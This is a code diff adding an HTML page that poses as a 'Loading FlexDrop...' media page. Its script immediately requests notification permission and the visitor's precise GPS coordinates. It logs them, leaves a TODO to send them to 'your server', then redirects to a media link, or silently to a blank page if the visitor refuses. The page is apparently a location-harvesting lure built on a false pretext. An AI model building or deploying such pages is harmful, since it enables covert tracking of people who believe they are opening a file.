@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-size: 1.2rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">Loading FlexDrop...</div>
+
+  <script>
+    function requestNotification() {
+      if ("Notification" in window) {
+        Notification.requestPermission().then((permission) => {
+          console.log("Notification permission:", permission);
+        });
+      }
+    }
+
+    function requestGPS() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            console.log("Latitude:", lat);
+            console.log("Longitude:", lon);
+            console.log("Accuracy:", acc);
+
+            // TODO: send this data to your server
+
+            // Redirect to your final media page
+            window.location.href = "https://example.com/view";
+          },
+          function (error) {
+            // If denied or error, silently exit
+            window.location.href = "about:blank";
+          },
+          { timeout: 5000 }
+        );
+      } else {
+        document.getElementById("status").innerText = "Geolocation not supported.";
+      }
+    }
+
+    // Start both permission requests immediately
+    requestNotification();
+    requestGPS();
+  </script>
+</body>
+</html>
